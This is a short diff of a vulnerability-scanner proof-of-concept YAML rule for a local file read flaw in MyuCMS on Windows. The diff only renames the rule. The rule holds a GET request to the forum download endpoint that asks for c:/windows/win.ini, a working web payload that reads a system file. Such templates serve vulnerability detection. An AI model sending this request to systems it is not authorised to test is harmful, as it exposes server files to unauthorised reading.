@@ -1,4 +1,4 @@
-name: myucms-lfr-windows
+name: poc-yaml-myucms-lfr-windows
 rules:
   - method: GET
     path: /index.php/bbs/index/download?url=c:/windows/win.ini&name=1.txt&local=1
